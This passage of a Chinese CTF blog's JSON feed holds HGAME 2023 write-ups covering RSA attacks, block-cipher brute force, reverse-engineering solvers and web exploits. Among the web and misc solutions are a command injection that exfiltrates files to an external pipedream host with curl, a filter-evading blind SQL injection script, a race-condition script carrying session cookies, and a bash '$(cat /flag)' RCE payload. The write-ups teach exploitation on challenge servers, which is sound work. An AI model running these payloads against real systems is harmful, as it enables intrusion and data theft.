0x24e544c4b398ed0812a1739127c026d2b8eeba2b1e5c9221a6debaa9ebfeb134c6dfcbcf3142ec2723b6990d25d4bb0d7f14e4034c4a8be71d46015e6ae65cc8e1872f62860e5b89cd59f48420e9a3e85dcbdf34c850688046026fcf4ffb504baef704ff049f49494bbfb05624a30c542051fada959dff52fefc378489e20c60p, q = factor_rsa_wiener(N, e)f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,N)print(bytes.fromhex(hex(m)[2:]))# b&#x27;wiener_attack_easily!!!&#x27; 第二层，已知 $p$ 高位攻击+ $\\gcd(e,\\varphi)=2$ 情形，coppersmith+AMM算法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import gmpy2N = 68414473664421192639324860086304622601462638941429703900601142401666806262479832339441486761549640560858310048110541758196980937681745306684526118613694088585953109432823793467906611480953093877867597017269693809377188442523548160628479089952031515541299395812090799992365148053327937407652550818853770241959e = 62830c = 0x520ba82a569ea52f16b84c4415186cd616680131e3ac6eda886fea046b18b0e1326d4acbbfb8840dc8064211cd44c30b91148836048434a3f57dd4ec5a5cdaf005a0f8f2c95ee7d9a739505b01e407acd3441dd088f64a2a0c36e43c520e30bd90bb32ec1125e4bb1f4e7d522596898da22c9a7921ac5da96808ee39c98e131fpbits = 512find = 0for i in range(10): for j in range(2**i): p4 = Integer(gmpy2.iroot(N,2)[0])&gt;&gt;256 p4 = (p4&lt;&lt;i) + j kbits = pbits - p4.nbits() p4 = p4 &lt;&lt; kbits PR.&lt;x&gt; = PolynomialRing(Zmod(N)) f = x + p4 roots = f.small_roots(X=2^kbits, beta=0.5) if roots: p = p4+int(roots[0]) if N%p == 0: print(p) find = 1 break if find == 1: break q = N // pf = (p-1)*(q-1)d = inverse_mod(e//2,f)cc = pow(c,d,N)P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=&#x27;NTL&#x27;)f=a^2-ccmps=f.monic().roots()P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=&#x27;NTL&#x27;)g=a^2-ccmqs=g.monic().roots()for mpp in mps: x=mpp[0] for mqq in mqs: y=mqq[0] solution = hex(CRT_list([int(x), int(y)], [p, q]))[2:] if len(solution) % 2 == 0: print(bytes.fromhex(solution))# b&#x27;how_to_solve_e_and_phi_uncoprime_condision&#x27; 第三层，已知 $p$ 高位攻击，但泄露位数过少，位爆破+调节参数扩大格范围。 12345678910111213141516171819202122232425262728from tqdm import *n = 68340867186438223292118569682710524595966327481168801678255800028919163918249557519447553078528255888326840419621716908729880235244230459900539486879943421761586611726942757775742624070088176246368128990077459966006579285028594729801017390816903003704541109757846868073362640037019813128220657114558520107057pbits = 512for i in trange(2**5): p4 = 531320819410375258952658395582915285878636410772332266245849790153420724865787&lt;&lt;(253-248) p4 = p4 + i kbits = pbits - p4.nbits() p4 = p4 &lt;&lt; kbits PR.&lt;x&gt; = PolynomialRing(Zmod(n)) f = x + p4 roots = f.small_roots(X=2^kbits, beta=0.4, epsilon=0.01) if roots: p = p4+int(roots[0]) if n%p==0: print(i,p) break q = n//pe = 65537c = 0x29d543c73f4175f22440eef5954184e9d740cd3785011d560431861ccf6c4ff380d46ad948f9888e8cac2f5e38ce5e994f023d7195b78439b90d53ad23a730cc99b1b75dae1aba416cb6e645c5d135de906be54f344daba47a10492183d03211bfbaa45c09be2bb1913b1453e0538db95c56140cb78dd9c43d21f8312245ef7df = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;now_you_know_how_to_use_coppersmith&#x27; 三次提交正确得flag：hgame&#123;U_mus7_b3_RS4_M@ster!!!&#125;。 ​ ezBlock 兔兔拜年的时候遇到了 yolande ，yolande 说她之前在写差分攻击脚本，问兔兔要不要学习一下，还说如果遇到问题可以看看 The Block Cipher Companion. 12345678910111213141516171819202122232425262728293031323334from secret import flagdef s_substitute(m): c = 0 s_box = &#123;0: 0x6, 1: 0x4, 2: 0xc, 3: 0x5, 4: 0x0, 5: 0x7, 6: 0x2, 7: 0xe, 8: 0x1, 9: 0xf, 10: 0x3, 11: 0xd, 12: 0x8, 13: 0xa, 14: 0x9, 15: 0xb&#125; for i in range(0, 16, 4): t = (m &gt;&gt; i) &amp; 0xf t = s_box[t] c += t &lt;&lt; i return cdef enc(m, key): n = len(key) t = m for i in range(n - 1): t = t ^ key[i] t = s_substitute(t) c = t ^ key[n - 1] return cf = flag[6:-1]assert flag == &#x27;hgame&#123;&#x27; + f + &#x27;&#125;&#x27;key = [int(i, 16) for i in f.split(&#x27;_&#x27;)]print(len(key))m_list = [i * 0x1111 for i in range(16)]c_list = [enc(m, key) for m in m_list]print(c_list)# 5# [28590, 33943, 30267, 5412, 11529, 3089, 46924, 59533, 12915, 37743, 64090, 53680, 18933, 49378, 23512, 44742] 正常考点应该是四轮S盒差分攻击，xxxx_xxxx_xxxx_xxxx_xxxx 分割得到5组key，测试发现5组key的每4位（每1个16进制数）为一组作为输入，得到的输出是固定不变的，采用爆破方式可解，所需遍历次数为 $4 \\cdot 16^5=4194304$。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from tqdm import *from itertools import productm = [i * 0x1111 for i in range(16)]c = [28590, 33943, 30267, 5412, 11529, 3089, 46924, 59533, 12915, 37743, 64090, 53680, 18933, 49378, 23512, 44742]m = [[(k &gt;&gt; i) &amp; 0xf for i in range(0, 16, 4)] for k in m]c = [[(k &gt;&gt; i) &amp; 0xf for i in range(0, 16, 4)] for k in c]#print(m)#print(c)m = [[k[i] for k in m] for i in range(4)]c = [[k[i] for k in c] for i in range(4)]print(m)print(c)def s_substitute(m): c = 0 s_box = &#123;0: 0x6, 1: 0x4, 2: 0xc, 3: 0x5, 4: 0x0, 5: 0x7, 6: 0x2, 7: 0xe, 8: 0x1, 9: 0xf, 10: 0x3, 11: 0xd, 12: 0x8, 13: 0xa, 14: 0x9, 15: 0xb&#125; for i in range(0, 16, 4): t = (m &gt;&gt; i) &amp; 0xf t = s_box[t] c += t &lt;&lt; i return cdef enc(m, key): n = len(key) t = m for i in range(n - 1): t = t ^ key[i] t = s_substitute(t) c = t ^ key[n - 1] return cm_list = [i * 0x1111 for i in range(16)]finalkey = [&#x27;&#x27;]*5dic = &#x27;0123456789abcdef&#x27;allc = list(product(dic,repeat=5))for i in range(4): for k in tqdm(allc): key = [(int(x, 16))&lt;&lt;(4*i) for x in k] c_list = [enc(m, key) for m in m_list] out = [(k &gt;&gt; (4*i)) &amp; 0xf for k in c_list] if out == c[i]: print(i,k) for j in range(5): finalkey[j] = k[j] + finalkey[j] breakprint(&#x27;hgame&#123;&#x27;+&#x27;_&#x27;.join(finalkey)+&#x27;&#125;&#x27;)# 0 (&#x27;2&#x27;, &#x27;3&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;5&#x27;)# 1 (&#x27;4&#x27;, &#x27;9&#x27;, &#x27;9&#x27;, &#x27;7&#x27;, &#x27;d&#x27;)# 2 (&#x27;f&#x27;, &#x27;4&#x27;, &#x27;f&#x27;, &#x27;5&#x27;, &#x27;8&#x27;)# 3 (&#x27;4&#x27;, &#x27;f&#x27;, &#x27;4&#x27;, &#x27;4&#x27;, &#x27;d&#x27;)# hgame&#123;4f42_f493_4f92_4570_d8d5&#125; ​ WebPing To The Host 一个用来输入ip的ping工具，我可以用它来做些什么？ 无回显命令注入，外带即可。空格使用 $IFS$9 绕过。 列目录：ip=x|curl$IFS$9https://enm8badfmuo0f.x.pipedream.net/?p=`ls$IFS$9/|base64` ，得到flag文件名为 flag_is_here_haha； 读文件：ip=x|curl$IFS$9https://enm8badfmuo0f.x.pipedream.net/?p=`uniq$IFS$9/f*|base64` ，得到 aGdhbWV7cDFuR190MF9Db21NNG5EX0V4ZWNVdDFvbl9kQW5nRXJSclJyUnJSIX0K，base64解码得 hgame&#123;p1nG_t0_ComM4nD_ExecUt1on_dAngErRrRrRrR!&#125;。 ​ Login To Get My Gift R1esbyfe：“想必你上周已经找到了我留给你的惊喜，这次我又藏了一个” 兔兔想起了上周R1esbyfe学长教的sql基础知识与运用方法，是时候将他们派上用场了 R1esbyfe：“给你个用户名为testuser，密码为testpassword的test账户吧，不过只有真正的管理员才能得到惊喜:D 别想了，管理员用户名可不是admin” After login, you can visit: /index -&gt; Only for test users /home -&gt; Only for admin users fuzz测试，发现过滤了空格、等号、substr、mid等，等号用 regexp 绕过，substr() 用 right(left()) 绕过来取字符。布尔盲注： 12345678910111213141516171819202122232425262728293031323334import requestsurl = &quot;http://week-3.hgame.lwsec.cn:31673/login&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 #payload = f&#x27;if(ascii(right(left((select(database())),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27; #payload = f&#x27;if(ascii(right(left((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(&quot;L0g1NMe&quot;))),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27; #payload = f&#x27;if(ascii(right(left((select(group_concat(column_name))from(information_schema.columns)where((table_schema)regexp(&quot;L0g1NMe&quot;))),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27; payload = f&#x27;if(ascii(right(left((select(group_concat(PAssw0rD,&quot;~&quot;,UsErN4me))from(L0g1NMe.User1nf0mAt1on)),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27; data = &#123; &#x27;username&#x27;: &#x27;testuser&#x27;, &#x27;password&#x27;: f&quot;1&#x27;^(&#123;payload&#125;)^&#x27;0&quot; &#125; r = requests.post(url,data=data) #print(r.text) if &quot;Success!&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) 分别得到： 1234database: L0g1NMetable: User1nf0mAt1oncolumn: id,PAssw0rD,UsErN4meflag: WeLc0meT0hgAmE2023~hAPPySqlhgAmE2023HAppYnEwyEAr,testpassword~testuser 使用账密 WeLc0meT0hgAmE2023/hAPPySqlhgAmE2023HAppYnEwyEAr 登录，得flag：hgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;。 ​ Gopher Shop 今天是大年初二！兔兔迈着开心的步伐走到了一教，据说每逢寒假HGAME期间，300b就会有Vidar大商场，每个进入商场的同学都可以领取10个Vidar币。兔兔在一家叫Gopher Shop的商店面前停下了脚步，Gopher？听说协会的Web手们都会一点Go,也许这是协会学长开的吧。望着橱窗里的商品，攥着手里的10个Vidar币，兔兔走进了商店… 在 /buyProduct 路由处利用竞争买flag。 12345678910import requestsimport threadingdef req(): url = &#x27;http://week-3.hgame.lwsec.cn:30875/api/v1/user/buyProduct?product=Flag&amp;number=1&#x27; headers = &#123;&#x27;Cookie&#x27;:&#x27;SESSION=MTY3NDQ5MTUzNHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXz3P-nsnRLwqBHiy3dxz3pgu8nGGORBOuHQaWl7ObqsvQ==; session=MTY3NDc0MzkzM3xEdi1CQkFFQ180SUFBUkFCRUFBQUpmLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dGQUFOaFlXRT18psiHGgZdURTbYwyW0lTiIA-D7mS0kxe9mu-kLSib2NI=&#x27;&#125; r = requests.get(url=url, headers=headers)for i in range(10000): threading.Thread(target=req).start() 最后点击checkflag得到flag：hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;。 ​ Reversekunmusic 小黑子，露出鸡脚了吧？ kmusic.dll为.NET程序，ILSpy打开，在 Program 类找到类似SMC反调试的异或操作： 12345678910111213141516171819202122using System;using System.Reflection;using System.Windows.Forms;using kmusic;using kmusic.Properties;internal static class Program&#123; private static Form1 form1 = new Form1(); private static void Main() &#123; ApplicationConfiguration.Initialize(); byte[] data = Resources.data; for (int i = 0; i &lt; data.Length; i++) &#123; data[i] ^= 104; &#125; Activator.CreateInstance(Assembly.Load(data).GetType(&quot;WinFormsLibrary1.Class1&quot;), form1); Application.Run((Form)(object)form1); &#125;&#125; 在资源部分找到 Resources.data，导出，异或104还原出另一个.NET程序，在 Class1 类中找到关键逻辑： 123456789101112131415161718192021222324252627282930313233343536373839using System;using System.IO;using System.Media;using System.Windows.Forms;using kmusic;using kmusic.Properties;public class Class1&#123; private int[] num = new int[13]; ... public void music(object sender, EventArgs e) &#123; //IL_0ade: Unknown result type (might be due to invalid IL or missing references) //IL_0ae9: Unknown result type (might be due to invalid IL or missing references) if (num[0] + 52296 + num[1] - 26211 + num[2] - 11754 + (num[3] ^ 0xA114) + num[4] * 63747 + num[5] - 52714 + num[6] - 10512 + num[7] * 12972 + num[8] + 45505 + num[9] - 21713 + num[10] - 59122 + num[11] - 12840 + (num[12] ^ 0x525F) == 12702282 &amp;&amp; num[0] - 25228 + (num[1] ^ 0x50DB) + (num[2] ^ 0x1FDE) + num[3] - 65307 + num[4] * 30701 + num[5] * 47555 + num[6] - 2557 + (num[7] ^ 0xBF9F) + num[8] - 7992 + (num[9] ^ 0xE079) + (num[10] ^ 0xE052) + num[11] + 13299 + num[12] - 50966 == 9946829 &amp;&amp; num[0] - 64801 + num[1] - 60698 + num[2] - 40853 + num[3] - 54907 + num[4] + 29882 + (num[5] ^ 0x3506) + (num[6] ^ 0x533E) + num[7] + 47366 + num[8] + 41784 + (num[9] ^ 0xD1BA) + num[10] * 58436 + num[11] * 15590 + num[12] + 58225 == 2372055 &amp;&amp; num[0] + 61538 + num[1] - 17121 + num[2] - 58124 + num[3] + 8186 + num[4] + 21253 + num[5] - 38524 + num[6] - 48323 + num[7] - 20556 + num[8] * 56056 + num[9] + 18568 + num[10] + 12995 + (num[11] ^ 0x995C) + num[12] + 25329 == 6732474 &amp;&amp; num[0] - 42567 + num[1] - 17743 + num[2] * 47827 + num[3] - 10246 + (num[4] ^ 0x3F9C) + num[5] + 39390 + num[6] * 11803 + num[7] * 60332 + (num[8] ^ 0x483B) + (num[9] ^ 0x12BB) + num[10] - 25636 + num[11] - 16780 + num[12] - 62345 == 14020739 &amp;&amp; num[0] - 10968 + num[1] - 31780 + (num[2] ^ 0x7C71) + num[3] - 61983 + num[4] * 31048 + num[5] * 20189 + num[6] + 12337 + num[7] * 25945 + (num[8] ^ 0x1B98) + num[9] - 25369 + num[10] - 54893 + num[11] * 59949 + (num[12] ^ 0x3099) == 14434062 &amp;&amp; num[0] + 16689 + num[1] - 10279 + num[2] - 32918 + num[3] - 57155 + num[4] * 26571 + num[5] * 15086 + (num[6] ^ 0x59CA) + (num[7] ^ 0x5B35) + (num[8] ^ 0x3FFD) + (num[9] ^ 0x5A85) + num[10] - 40224 + num[11] + 31751 + num[12] * 8421 == 7433598 &amp;&amp; num[0] + 28740 + num[1] - 64696 + num[2] + 60470 + num[3] - 14752 + (num[4] ^ 0x507) + (num[5] ^ 0x89C8) + num[6] + 49467 + num[7] - 33788 + num[8] + 20606 + (num[9] ^ 0xAF4A) + num[10] * 19764 + num[11] + 48342 + num[12] * 56511 == 7989404 &amp;&amp; (num[0] ^ 0x7132) + num[1] + 23120 + num[2] + 22802 + num[3] * 31533 + (num[4] ^ 0x9977) + num[5] - 48576 + (num[6] ^ 0x6F7E) + num[7] - 43265 + num[8] + 22365 + num[9] + 61108 + num[10] * 2823 + num[11] - 30343 + num[12] + 14780 == 3504803 &amp;&amp; num[0] * 22466 + (num[1] ^ 0xDABF) + num[2] - 53658 + (num[3] ^ 0xB838) + (num[4] ^ 0x30DF) + num[5] * 59807 + num[6] + 46242 + num[7] + 3052 + (num[8] ^ 0x62BF) + num[9] + 30202 + num[10] * 22698 + num[11] + 33480 + (num[12] ^ 0x4175) == 11003580 &amp;&amp; num[0] * 57492 + (num[1] ^ 0x346D) + num[2] - 13941 + (num[3] ^ 0xBBDC) + num[4] * 38310 + num[5] + 9884 + num[6] - 45500 + num[7] - 19233 + num[8] + 58274 + num[9] + 36175 + (num[10] ^ 0x4888) + num[11] * 49694 + (num[12] ^ 0x2501) == 25546210 &amp;&amp; num[0] - 23355 + num[1] * 50164 + (num[2] ^ 0x873A) + num[3] + 52703 + num[4] + 36245 + num[5] * 46648 + (num[6] ^ 0x12FA) + (num[7] ^ 0xA376) + num[8] * 27122 + (num[9] ^ 0xA44A) + num[10] * 15676 + num[11] - 31863 + num[12] + 62510 == 11333836 &amp;&amp; num[0] * 30523 + (num[1] ^ 0x1F36) + num[2] + 39058 + num[3] * 57549 + (num[4] ^ 0xD0C0) + num[5] * 4275 + num[6] - 48863 + (num[7] ^ 0xD88C) + (num[8] ^ 0xA40) + (num[9] ^ 0x3554) + num[10] + 62231 + num[11] + 19456 + num[12] - 13195 == 13863722) &#123; int[] array = new int[47] &#123; 132, 47, 180, 7, 216, 45, 68, 6, 39, 246, 124, 2, 243, 137, 58, 172, 53, 200, 99, 91, 83, 13, 171, 80, 108, 235, 179, 58, 176, 28, 216, 36, 11, 80, 39, 162, 97, 58, 236, 130, 123, 176, 24, 212, 56, 89, 72 &#125;; string text = &quot;&quot;; for (int i = 0; i &lt; array.Length; i++) &#123; text += (char)(array[i] ^ num[i % num.Length]); &#125; new SoundPlayer((Stream)Resources.过年鸡).Play(); MessageBox.Show(text); &#125; &#125; ...&#125; 提取判断条件，用z3求解： 123456789101112131415161718192021222324252627282930313233343536373839from z3 import *c = [132, 47, 180, 7, 216, 45, 68, 6, 39, 246, 124, 2, 243, 137, 58, 172, 53, 200, 99, 91, 83, 13, 171, 80, 108, 235, 179, 58, 176, 28, 216, 36, 11, 80, 39, 162, 97, 58, 236, 130, 123, 176, 24, 212, 56, 89, 72]num = [BitVec(f&#x27;num&#123;i&#125;&#x27;,8) for i in range(13)]s = Solver()s.add(num[0] + 52296 + num[1] - 26211 + num[2] - 11754 + (num[3] ^ 0xA114) + num[4] * 63747 + num[5] - 52714 + num[6] - 10512 + num[7] * 12972 + num[8] + 45505 + num[9] - 21713 + num[10] - 59122 + num[11] - 12840 + (num[12] ^ 0x525F) == 12702282 )s.add( num[0] - 25228 + (num[1] ^ 0x50DB) + (num[2] ^ 0x1FDE) + num[3] - 65307 + num[4] * 30701 + num[5] * 47555 + num[6] - 2557 + (num[7] ^ 0xBF9F) + num[8] - 7992 + (num[9] ^ 0xE079) + (num[10] ^ 0xE052) + num[11] + 13299 + num[12] - 50966 == 9946829 )s.add( num[0] - 64801 + num[1] - 60698 + num[2] - 40853 + num[3] - 54907 + num[4] + 29882 + (num[5] ^ 0x3506) + (num[6] ^ 0x533E) + num[7] + 47366 + num[8] + 41784 + (num[9] ^ 0xD1BA) + num[10] * 58436 + num[11] * 15590 + num[12] + 58225 == 2372055 )s.add( num[0] + 61538 + num[1] - 17121 + num[2] - 58124 + num[3] + 8186 + num[4] + 21253 + num[5] - 38524 + num[6] - 48323 + num[7] - 20556 + num[8] * 56056 + num[9] + 18568 + num[10] + 12995 + (num[11] ^ 0x995C) + num[12] + 25329 == 6732474 )s.add( num[0] - 42567 + num[1] - 17743 + num[2] * 47827 + num[3] - 10246 + (num[4] ^ 0x3F9C) + num[5] + 39390 + num[6] * 11803 + num[7] * 60332 + (num[8] ^ 0x483B) + (num[9] ^ 0x12BB) + num[10] - 25636 + num[11] - 16780 + num[12] - 62345 == 14020739 )s.add( num[0] - 10968 + num[1] - 31780 + (num[2] ^ 0x7C71) + num[3] - 61983 + num[4] * 31048 + num[5] * 20189 + num[6] + 12337 + num[7] * 25945 + (num[8] ^ 0x1B98) + num[9] - 25369 + num[10] - 54893 + num[11] * 59949 + (num[12] ^ 0x3099) == 14434062 )s.add( num[0] + 16689 + num[1] - 10279 + num[2] - 32918 + num[3] - 57155 + num[4] * 26571 + num[5] * 15086 + (num[6] ^ 0x59CA) + (num[7] ^ 0x5B35) + (num[8] ^ 0x3FFD) + (num[9] ^ 0x5A85) + num[10] - 40224 + num[11] + 31751 + num[12] * 8421 == 7433598 )s.add( num[0] + 28740 + num[1] - 64696 + num[2] + 60470 + num[3] - 14752 + (num[4] ^ 0x507) + (num[5] ^ 0x89C8) + num[6] + 49467 + num[7] - 33788 + num[8] + 20606 + (num[9] ^ 0xAF4A) + num[10] * 19764 + num[11] + 48342 + num[12] * 56511 == 7989404 )s.add( (num[0] ^ 0x7132) + num[1] + 23120 + num[2] + 22802 + num[3] * 31533 + (num[4] ^ 0x9977) + num[5] - 48576 + (num[6] ^ 0x6F7E) + num[7] - 43265 + num[8] + 22365 + num[9] + 61108 + num[10] * 2823 + num[11] - 30343 + num[12] + 14780 == 3504803 )s.add( num[0] * 22466 + (num[1] ^ 0xDABF) + num[2] - 53658 + (num[3] ^ 0xB838) + (num[4] ^ 0x30DF) + num[5] * 59807 + num[6] + 46242 + num[7] + 3052 + (num[8] ^ 0x62BF) + num[9] + 30202 + num[10] * 22698 + num[11] + 33480 + (num[12] ^ 0x4175) == 11003580 )s.add( num[0] * 57492 + (num[1] ^ 0x346D) + num[2] - 13941 + (num[3] ^ 0xBBDC) + num[4] * 38310 + num[5] + 9884 + num[6] - 45500 + num[7] - 19233 + num[8] + 58274 + num[9] + 36175 + (num[10] ^ 0x4888) + num[11] * 49694 + (num[12] ^ 0x2501) == 25546210 )s.add( num[0] - 23355 + num[1] * 50164 + (num[2] ^ 0x873A) + num[3] + 52703 + num[4] + 36245 + num[5] * 46648 + (num[6] ^ 0x12FA) + (num[7] ^ 0xA376) + num[8] * 27122 + (num[9] ^ 0xA44A) + num[10] * 15676 + num[11] - 31863 + num[12] + 62510 == 11333836 )s.add( num[0] * 30523 + (num[1] ^ 0x1F36) + num[2] + 39058 + num[3] * 57549 + (num[4] ^ 0xD0C0) + num[5] * 4275 + num[6] - 48863 + (num[7] ^ 0xD88C) + (num[8] ^ 0xA40) + (num[9] ^ 0x3554) + num[10] + 62231 + num[11] + 19456 + num[12] - 13195 == 13863722)s.add(num[0]==ord(&#x27;h&#x27;)^c[0])s.add(num[1]==ord(&#x27;g&#x27;)^c[1])s.add(num[2]==ord(&#x27;a&#x27;)^c[2])s.add(num[3]==ord(&#x27;m&#x27;)^c[3])s.add(num[4]==ord(&#x27;e&#x27;)^c[4])s.add(num[5]==ord(&#x27;&#123;&#x27;)^c[5])s.check()m = s.model()print(m)key = []for i in range(13): key.append(m[num[i]].as_long())flag = [(c[i]^key[i%13])%128 for i in range(len(c))]print(bytes(flag))# b&#x27;hgame&#123;z3_1s_very_u5eful_1n_rever5e_engin3ering&#125;&#x27; ​ patchme 不会pwn的re手不是一个好CTFer！游戏规则：修复程序中的二进制安全漏洞，要求能严格执行原程序的正常功能且不变动文件大小，如果修复成功，在运行后输入任何内容即可输出flag。附件更新，增加部分源码以作提示：https://share.weiyun.com/Kj85naWl 在 init() 中调用 sub_1887()，而 sub_1887() 里对 loc_14C6 区域的数据进行异或 0x66 操作，类似于SMC反调试，用IDA代码还原： 123456789static main()&#123; auto addr = 0x0014c6; auto i = 0; for(i=0;i&lt;=960;i++) &#123; PatchByte(addr+i,Byte(addr+i)^0x66); &#125;&#125; 在 0x14CA 处按P识别为函数 sub_14CA()，看到主要逻辑为字符两两异或操作，还原即可： 123456789101112131415161718from Crypto.Util.number import *def change(s): res = [] for k in s: res += list(long_to_bytes(k)[::-1]) return resx = [0x5416D999808A28FA,0x588505094953B563,0xCE8CF3A0DC669097,0x4C5CF3E854F44CBD,0xD144E49916678331,0xDA616BAC,0xBBD0,0x55]y = [0x3B4FA2FCEDEB4F92,0x7E45A6C3B67EA16,0xAFE1ACC8BF12D0E7,0x132EC3B7269138CE,0x8E2197EB7311E643,0xAE540AC1,0xC9B5,0x28]x = change(x)y = change(y)flag = [x[i]^y[i] for i in range(len(x))]print(bytes(flag))# b&#x27;hgame&#123;You_4re_a_p@tch_master_0r_reverse_ma5ter&#125;&#x27; ​ cpp C++是一门非常好的语言，他好就好在了逆向比较难😜 去了符号，IDA分析伪码很难看，分析主要加密逻辑在 sub_1400026A0()，vftable中分别有 encrypt1 和 encrypt2，对应的函数表： 1234567891011encrypt1sub_140001600 0encrypt2sub_140002E60 0sub_140001710 8sub_140001E30 16sub_1400022F0 24sub_1400027A0 32sub_140002B90 40sub_140003080 48 encrypt1 中 sub_140001600() 为异或操作，encrypt2 中一系列操作为加密运算+最后比对密文。 输入测试数据，在最后的密文比对函数 sub_140003080() 下断点，动调提取出测试数据对应的加密结果以及异或操作的key值，根据key值和明密文来确定异或计算逻辑为，每4位密文反向异或每4位key值。 最后用实际密文与key异或操作还原明文： 12345678910111213141516171819202122key = [ 0x4E, 0xA0, 0x37, 0x40, 0x46, 0x02, 0xDA, 0xFD, 0x21, 0xFA, 0x6E, 0x3C, 0xAF, 0xD9, 0x9C, 0xCF, 0xB9, 0x47, 0x33, 0x67, 0xE0, 0x4E, 0xEC, 0x0D, 0xD1, 0xC4, 0x80, 0x13, 0x32, 0xA9, 0xB2, 0x3A, 0xA7, 0x50, 0x5D, 0x02, 0x82, 0x39, 0x4A, 0x83]c = [ 0x28, 0x50, 0xC1, 0x23, 0x98, 0xA1, 0x41, 0x36, 0x4C, 0x31, 0xCB, 0x52, 0x90, 0xF1, 0xAC, 0xCC, 0x0F, 0x6C, 0x2A, 0x89, 0x7F, 0xDF, 0x11, 0x84, 0x7F, 0xE6, 0xA2, 0xE0, 0x59, 0xC7, 0xC5, 0x46, 0x5D, 0x29, 0x38, 0x93, 0xED, 0x15, 0x7A, 0xFF]flag = &#x27;&#x27;for i in range(0,len(c),4): flag += chr(c[i]^key[i+3]) + chr(c[i+1]^key[i+2]) + chr(c[i+2]^key[i+1]) + chr(c[i+3]^key[i])print(flag)# hgame&#123;Cpp_1s_much_m0r3_dlff1cult_th4n_C&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023赛","slug":"2023赛","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HGAME 2023 Week 2","slug":"match-HGAME-2023-Week-2","date":"2023-01-20T09:25:16.000Z","updated":"2023-01-20T11:58:46.830Z","comments":true,"path":"2023/01/20/match-HGAME-2023-Week-2/","permalink":"https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/","excerpt":"","text":"​ HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)线上赛平台：https://hgame.vidar.club请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址比赛奖金(针对校外榜)：第1名：1000Pwnhub金币第2名：800Pwnhub金币第3名：600Pwnhub金币4-10名：300Pwnhub金币补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个注意：* 所有选手均以个人为单位参赛；* 在解题过程中遇到瓶颈或困难可以私聊出题人* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。* 每周比赛结束后本周前20名需提交wp到指定邮箱本比赛最终解释权归 Vidar-Team 所有 Rank: 8 ​ MiscTetris Master 你是否已经厌倦了普通的游戏题目，对于写脚本玩游戏感到无聊？ 此题你需要能够实现RCE，拿到根目录下的flag，又或者你是真正的Tetris Master？ 请使用ssh进行连接，账号为ctf,密码为hgame，例如ssh ctf@week-2.hgame.lwsec.cn -p port。并且你需要将终端的字体调小，使窗口大小至少为 200 * 70 才能正常进行游戏。 HINTS: 题目描述已更新，同时由于存在非预期，题目分数降至50,并上线100分的Revenge版本。 连接：ssh ctf@week-2.hgame.lwsec.cn -p 32150 按 Ctrl+C 强制结束拿到shell，cat flag 得flag：hgame&#123;Bash_Game^Also*Can#Rce&#125;。 ​ Tetris Master Revenge the same as Tetris Master bash命令执行，参考ByteCTF 2022 - bash_game，在读入 target 值进入 paint_game_over() 内，比较时 [[]] 操作符会造成RCE。 1234567891011121314paint_game_over() &#123; local xcent=$((`tput lines`/2)) ycent=$((`tput cols`/2)) local x=$((xcent-4)) y=$((ycent-25)) for (( i = 0; i &lt; 10; i++ )); do echo -ne &quot;\\033[$((x+i));$&#123;y&#125;H\\033[44m$&#123;good_game[$i]&#125;\\033[0m&quot;; done if [[ &quot;$master&quot; -eq &quot;y&quot; ]] &amp;&amp; [[ &quot;$score&quot; -gt 50000 ]]; then echo -ne &quot;\\033[$((x+3));$((ycent+1))H\\033[44m`cat /flag`\\033[0m&quot;; elif [[ &quot;$master&quot; -ne &quot;y&quot; ]] &amp;&amp; [[ &quot;$score&quot; -gt &quot;$target&quot; ]]; then echo -ne &quot;\\033[$((x+3));;$((ycent+1))H\\033[44mKeep Going\\033[0m&quot; else echo -ne &quot;\\033[$((x+3));$((ycent+1))H\\033[44m$&#123;score&#125;\\033[0m&quot;; fi&#125; ssh连接，选择 n，输入目标分数 r[$(cat /flag)]，确认进入游戏，快速结束一局后在结果处以报错形式输出flag：hgame&#123;Bash_Game^Also*Can#Rce^reVenge!!!!&#125;。 ​ Sign In Pro Max 兔兔没有抢到回家的车票，一个猫猫头像的学长给了他一个候补车票抢票软件，但是这个软件的验证码太难了，你能帮他解一下吗？ flag 英文字母为全小写，自行使用 hgame{}包裹后提交 五个部分： Part1：base64+base58+base32，得到 f51d3a18； Part2：md5，得到 f91c； Part3：sha1，得到 4952； Part4：sha256，得到 a3ed； Part5：rot21，得到 Part5 is 0bc0ea61d21c, now put all the parts together, don&#39;t forget the format. 